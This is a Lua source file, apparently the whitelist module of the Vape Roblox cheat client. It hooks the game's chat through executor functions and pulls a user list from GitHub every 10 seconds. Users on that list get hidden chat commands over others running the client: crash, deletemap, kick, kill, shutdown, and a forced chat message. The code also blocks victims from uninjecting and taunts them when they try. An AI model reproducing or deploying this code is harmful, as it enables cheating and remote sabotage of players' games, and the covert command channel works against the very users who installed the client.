
run(function()
	function whitelist:get(plr)
		local plrstr = self.hashes[plr.Name..plr.UserId]
		for _, v in self.data.WhitelistedUsers do
			if v.hash == plrstr then
				return v.level, v.attackable or whitelist.localprio >= v.level, v.tags
			end
		end

		return 0, true
	end

	function whitelist:isingame()
		for _, v in playersService:GetPlayers() do
			if self:get(v) ~= 0 then
				return true
			end
		end

		return false
	end

	function whitelist:tag(plr, text, rich)
		local plrtag, newtag = table.clone(select(3, self:get(plr)) or self.customtags[plr.Name] or {}), ''
		for _, v in self.tagcallback do
			v(plr, plrtag, rich)
		end

		if not text then
			return plrtag
		end

		for _, v in plrtag do
			newtag = newtag..(rich and v.color and '<font color="#'..v.color:ToHex()..'">['..v.text..']</font>' or '['..removeTags(v.text)..']')..' '
		end

		return newtag
	end

	function whitelist:getplayer(arg, plr)
		if arg == 'default' and self.localprio == 0 then
			return true
		end

		if arg == 'private' and self.localprio == 1 then
			return true
		end

		if arg == 'others' and plr ~= lplr then
			return true
		end

		if arg and lplr.Name:lower():sub(1, arg:len()) == arg:lower() then
			return true
		end

		return false
	end

	local olduninject
	function whitelist:playeradded(v, joined)
		if self:get(v) ~= 0 then
			if self.alreadychecked[v.UserId] then return end
			self.alreadychecked[v.UserId] = true
			self:hook()

			if self.localprio == 0 then
				olduninject = vape.Uninject
				vape.Uninject = function()
					notif('Vape', 'No escaping the private members :)', 10)
				end
			end
		end
	end

	function whitelist:process(msg, plr)
		if self.localprio < self:get(plr) or plr == lplr then
			local args = msg:split(' ')
			table.remove(args, 1)

			if self:getplayer(args[1], plr) then
				table.remove(args, 1)
				for cmd, func in self.commands do
					if msg:sub(1, cmd:len() + 1):lower() == ';'..cmd:lower() then
						func(args, plr)
						return true
					end
				end
			end
		end

		return false
	end

	function whitelist:newchat(obj, plr, skip)
		obj.PrefixText = self:tag(plr, true, true)..(obj.PrefixText or '')

		if not skip and self:process(obj.Text, plr) then
			obj.Visible = false
		end
	end

	function whitelist:oldchat(func)
		local msgtable, oldchat = debug.getupvalue(func, 3)
		if typeof(msgtable) == 'table' and msgtable.CurrentChannel then
			whitelist.oldchattable = msgtable
		end

		oldchat = hookfunction(func, function(data, ...)
			local plr = playersService:GetPlayerByUserId(data.SpeakerUserId)
			if plr then
				data.ExtraData.Tags = data.ExtraData.Tags or {}
				for _, v in self:tag(plr) do
					table.insert(data.ExtraData.Tags, {TagText = v.text, TagColor = v.color})
				end

				if data.Message and self:process(data.Message, plr) then
					data.Message = ''
				end
			end

			return oldchat(data, ...)
		end)

		vape:Clean(function()
			hookfunction(func, oldchat)
		end)
	end

	function whitelist:hook()
		if self.hooked then return end
		self.hooked = true

		if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
			if getcallbackvalue and restorefunction and hookfunction then
				local old
				task.spawn(function()
					vape:Clean(function()
						if old then
							restorefunction(old)
							old = nil
						end
					end)

					repeat
						local current = getcallbackvalue(textChatService, 'OnIncomingMessage')

						if old ~= current and current then
							if old then
								restorefunction(old)
							end

							local hook
							hook = hookfunction(current, function(...)
								local msg = ...
								local data = hook(...)
								local plr = msg.TextSource and playersService:GetPlayerByUserId(msg.TextSource.UserId)

								if plr then
									if not (data and data:IsA('TextChatMessageProperties') and data.PrefixText ~= '') then
										data = Instance.new('TextChatMessageProperties')
										data.PrefixText = msg.PrefixText
										data.Text = msg.Text
									end

									self:newchat(data, plr, msg.Status ~= Enum.TextChatMessageStatus.Success)
								end

								return data
							end)

							old = current
						end

						task.wait(0.1)
					until vape.Loaded == nil
				end)
			end
		elseif replicatedStorage:FindFirstChild('DefaultChatSystemChatEvents') then
			pcall(function()
				for _, v in getconnections(replicatedStorage.DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent) do
					if v.Function and table.find(debug.getconstants(v.Function), 'UpdateMessagePostedInChannel') then
						whitelist:oldchat(v.Function)
						break
					end
				end

				for _, v in getconnections(replicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent) do
					if v.Function and table.find(debug.getconstants(v.Function), 'UpdateMessageFiltered') then
						whitelist:oldchat(v.Function)
						break
					end
				end
			end)
		end
	end

	function whitelist:announce(text)
		local success, sendToast = pcall(function()
			local getAppIdHook = getrenv().require(game:GetService('CorePackages').Workspace.Packages._Workspace.AppCommonLib.AppCommonLib.Release.getNumericalApplicationId)
			local messageBusHook = getrenv().require(game:GetService('CorePackages').Workspace.Packages._Workspace.MessageBus.MessageBus.MessageBus)
			messageBusHook.getMessageId = function() end
			hookfunction(getAppIdHook, function()
				return 0
			end)

			local localizationService = game:GetService('LocalizationService')
			local root = game:GetService('CorePackages').Workspace.Packages._Index.NotificationModalsManager.NotificationModalsManager
			local reactBlox = getrenv().require(root.ReactRoblox)
			local react = getrenv().require(root.React)
			local UIBlox = getrenv().require(root.UIBlox)
			UIBlox.init(getrenv().require(game:GetService('CorePackages').Packages._Index.UIBlox.UIBlox.UIBloxDefaultConfig))
			local toastDialog = UIBlox.App.Dialog.Toast
			local localization = getrenv().require(root.InExperienceLocales).Localization
			local localProvider = getrenv().require(root.Localization).LocalizationProvider
			local defaultTheme = getrenv().require(root.Style).StyleProviderWithDefaultTheme
			local renderGui = nil

			local function createToast(content)
				return react.createElement(localProvider, {
					localization = localization.new(localizationService.RobloxLocaleId)
				}, {
					StyleProvider = react.createElement(defaultTheme, {}, {
						ToastWrapper = react.createElement('ScreenGui', {
							IgnoreGuiInset = true,
							ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
							ResetOnSpawn = false,
							DisplayOrder = 12
						}, {
							Toast = react.createElement(toastDialog, {
								duration = 20,
								toastContent = content
							})
						})
					})
				})
			end

			return function(content)
				if not renderGui then
					local folder = Instance.new('Folder')
					folder.Name = 'UIBloxToast'
					folder.Parent = game:GetService('CoreGui')
					folder.ChildRemoved:Once(function()
						folder:Destroy()
						renderGui = nil
					end)

					renderGui = reactBlox.createRoot(folder)
				end

				renderGui:render(react.createElement(createToast, content))
			end
		end)

		if success then
			return sendToast({
				toastTitle = text,
				iconImage = getcustomasset('catsixextra/assets/new/vape.png'),
				swipeUpDismiss = true,
				onActivated = function() end
			})
		end

		local container = Instance.new('TextButton')
		container.Size = UDim2.new(1, -24, 0, 60)
		container.Position = UDim2.new(0.5, 0, 0, -60)
		container.AnchorPoint = Vector2.new(0.5, 0)
		container.BackgroundTransparency = 1
		container.Text = ''
		container.Parent = vape.gui
		local constraint = Instance.new('UISizeConstraint')
		constraint.MinSize = Vector2.new(24, 60)
		constraint.MaxSize = Vector2.new(600, math.huge)
		constraint.Parent = container
		local bkg = Instance.new('ImageLabel')
		bkg.Size = UDim2.fromScale(1, 1)
		bkg.Position = UDim2.fromScale(0.5, 0.5)
		bkg.AnchorPoint = Vector2.new(0.5, 0.5)
		bkg.BackgroundTransparency = 1
		bkg.Image = 'rbxasset://LuaPackages/Packages/_Index/FoundationImages/FoundationImages/SpriteSheets/img_set_1x_3.png'
		bkg.ImageRectOffset = Vector2.new(490, 196)
		bkg.ImageRectSize = Vector2.new(21, 21)
		bkg.ScaleType = Enum.ScaleType.Slice
		bkg.SliceCenter = Rect.new(10, 10, 11, 11)
		bkg.ImageColor3 = Color3.fromRGB(39, 41, 48)
		bkg.Parent = container
		local holder = Instance.new('Frame')
		holder.Size = UDim2.fromScale(1, 1)
		holder.BackgroundTransparency = 1
		holder.ClipsDescendants = true
		holder.Parent = bkg
		local listlayout = Instance.new('UIListLayout')
		listlayout.Padding = UDim.new(0, 12)
		listlayout.FillDirection = Enum.FillDirection.Horizontal
		listlayout.VerticalAlignment = Enum.VerticalAlignment.Center
		listlayout.SortOrder = Enum.SortOrder.LayoutOrder
		listlayout.Parent = holder
		local padding = Instance.new('UIPadding')
		padding.PaddingBottom = UDim.new(0, 12)
		padding.PaddingLeft = UDim.new(0, 12)
		padding.PaddingRight = UDim.new(0, 12)
		padding.PaddingTop = UDim.new(0, 12)
		padding.Parent = holder
		local mainframe = Instance.fromExisting(holder)
		mainframe.ClipsDescendants = false
		mainframe.Parent = holder
		local listlayout2 = Instance.fromExisting(listlayout)
		listlayout2.Parent = mainframe
		local textframe = Instance.new('Frame')
		textframe.Size = UDim2.new(1, -48, 0, 22)
		textframe.BackgroundTransparency = 1
		textframe.LayoutOrder = 2
		textframe.Parent = mainframe
		local textlabel = Instance.new('TextLabel')
		textlabel.Size = UDim2.new(1, 0, 0, 22)
		textlabel.BackgroundTransparency = 1
		textlabel.Text = text
		textlabel.TextSize = 20
		textlabel.TextColor3 = Color3.fromRGB(247, 247, 248)
		textlabel.TextXAlignment = Enum.TextXAlignment.Left
		textlabel.FontFace = Font.fromName('BuilderSans', Enum.FontWeight.Bold)
		textlabel.Parent = textframe
		local iconframe = Instance.new('Frame')
		iconframe.Size = UDim2.fromOffset(36, 36)
		iconframe.BackgroundTransparency = 1
		iconframe.Parent = mainframe
		local icon = Instance.new('ImageLabel')
		icon.Size = UDim2.fromOffset(36, 36)
		icon.Image = getcustomasset('catsixextra/assets/new/vape.png')
		icon.BackgroundTransparency = 1
		icon.Parent = iconframe
		constraint.MaxSize = Vector2.new(math.max(getfontsize(text, 20, textlabel.FontFace).X + 80, 600), math.huge)

		tween:Tween(container, TweenInfo.new(0.3), {
			Position = UDim2.new(0.5, 0, 0, 20)
		})

		task.delay(20, function()
			if vape.Loaded ~= nil then
				tween:Tween(container, TweenInfo.new(0.3), {
					Position = UDim2.new(0.5, 0, 0, -60)
				})

				task.wait(0.3)
				container:Destroy()
			end
		end)
	end

	function whitelist:update(first)
		local suc = pcall(function()
			local _, subbed = pcall(function()
				return game:HttpGet('https://github.com/ah2r/whitelist')
			end)
			local commit = subbed:find('currentOid')
			commit = commit and subbed:sub(commit + 13, commit + 52) or nil
			commit = commit and #commit == 40 and commit or 'main'
			whitelist.textdata = game:HttpGet('https://raw.githubusercontent.com/ah2r/whitelist/'..commit..'/whitelist.json', true)
		end)
		if not suc or not hash or not whitelist.get then return true end
		whitelist.loaded = true

		if not first or whitelist.textdata ~= whitelist.olddata then
			if not first then
				whitelist.olddata = isfile('catsixextra/profiles/whitelist.json') and readfile('catsixextra/profiles/whitelist.json') or nil
			end

			local suc, res = pcall(function()
				return httpService:JSONDecode(whitelist.textdata)
			end)

			whitelist.data = suc and type(res) == 'table' and res or whitelist.data
			whitelist.localprio = whitelist:get(lplr)

			for _, v in whitelist.data.WhitelistedUsers do
				if v.tags then
					for _, tag in v.tags do
						tag.color = Color3.fromRGB(unpack(tag.color))
					end
				end
			end

			if not whitelist.connection then
				whitelist.connection = playersService.PlayerAdded:Connect(function(v)
					whitelist:playeradded(v, true)
				end)
				vape:Clean(whitelist.connection)
			end

			for _, v in playersService:GetPlayers() do
				whitelist:playeradded(v)
			end

			if entitylib.Running and vape.Loaded then
				entitylib.refresh()
			end

			if whitelist.textdata ~= whitelist.olddata then
				whitelist.olddata = whitelist.textdata
				pcall(function()
					writefile('catsixextra/profiles/whitelist.json', whitelist.textdata)
				end)
			end
		end
	end

	whitelist.commands = {
		crash = function()
			task.spawn(function()
				repeat
					local part = Instance.new('Part')
					part.Size = Vector3.new(1e10, 1e10, 1e10)
					part.Parent = workspace
				until false
			end)
		end,
		deletemap = function()
			local terrain = workspace:FindFirstChildWhichIsA('Terrain')
			if terrain then
				terrain:Clear()
			end

			for _, v in workspace:GetChildren() do
				if v ~= terrain and not v:IsDescendantOf(lplr.Character) and not v:IsA('Camera') then
					v:Destroy()
					v:ClearAllChildren()
				end
			end
		end,
		framerate = function(args)
			if #args < 1 or not setfpscap then return end
			setfpscap(tonumber(args[1]) ~= '' and math.clamp(tonumber(args[1]) or 9999, 1, 9999) or 9999)
		end,
		gravity = function(args)
			workspace.Gravity = tonumber(args[1]) or workspace.Gravity
		end,
		jump = function()
			if entitylib.isAlive and entitylib.character.Humanoid.FloorMaterial ~= Enum.Material.Air then
				entitylib.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
			end
		end,
		kick = function(args)
			task.spawn(function()
				lplr:Kick(table.concat(args, ' '))
			end)
		end,
		kill = function()
			if entitylib.isAlive then
				entitylib.character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
				entitylib.character.Humanoid.Health = 0
			end
		end,
		reveal = function()
			task.delay(0.1, function()
				if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
					textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync('I am using the inhaler client')
				else
					replicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('I am using the inhaler client', 'All')
				end
			end)
		end,
		shutdown = function()
			game:Shutdown()
		end,
		toggle = function(args)
			if #args < 1 then return end
			if args[1]:lower() == 'all' then
				for i, v in vape.Modules do
					if i ~= 'Panic' and i ~= 'ServerHop' and i ~= 'Rejoin' then
						v:Toggle()
					end
				end
			else
				for i, v in vape.Modules do
					if i:lower() == args[1]:lower() then
						v:Toggle()
						break
					end
				end
			end
		end,
		trip = function()
			if entitylib.isAlive then
				if entitylib.character.RootPart.Velocity.Magnitude < 15 then
					entitylib.character.RootPart.Velocity = entitylib.character.RootPart.CFrame.LookVector * 15
				end
				entitylib.character.Humanoid:ChangeState(Enum.HumanoidStateType.FallingDown)
			end
		end,
		uninject = function()
			if olduninject then
				if vape.ThreadFix then
					setthreadidentity(8)
				end
				olduninject(vape)
			else
				vape:Uninject()
			end
		end,
		void = function()
			if entitylib.isAlive then
				entitylib.character.RootPart.CFrame += Vector3.new(0, -1000, 0)
			end
		end
	}

	task.spawn(function()
		repeat
			if whitelist:update(whitelist.loaded) then return end
			task.wait(10)
		until vape.Loaded == nil
	end)

	vape:Clean(function()
		table.clear(whitelist.commands)
		table.clear(whitelist.data)
		table.clear(whitelist)
	end)
end)
